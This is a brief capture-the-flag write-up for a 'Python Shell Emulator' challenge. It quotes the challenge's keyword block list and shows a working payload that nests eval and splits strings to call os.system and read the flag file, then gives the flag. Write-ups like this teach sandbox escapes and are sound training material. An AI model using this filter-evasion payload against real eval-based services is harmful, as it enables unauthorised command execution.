# Remote Conda Escapist
> Blahaj just made his very first Python Shell Emulator as part of a school graded assignment, and says no one can hack it. Prove him wrong.

## Solution
There are many hints littered around the code provided. The most useful of which is this:
```py
# Should be fine to leave out eval, after all I am already doing it
unsafe = ['os', 'cat', 'flag', 'ls', 'system', 'popen', 'open', 'import', 'call', 'read', 'exec']
```
The comment hints that we should use `eval` somehow to bypass this filter. If you think a bit, you will realise you can just run `eval` in the `eval`.
This makes bypassing really easy since we just wrap it within a `eval` function.

Payload: `eval('o' + 's.sys' + 'tem("cat fl" + "ag.txt")')`
This basically becomes: `eval('os.system("cat flag.txt")')`

flag: `blahaj{oops_should_have_filtered_eval}`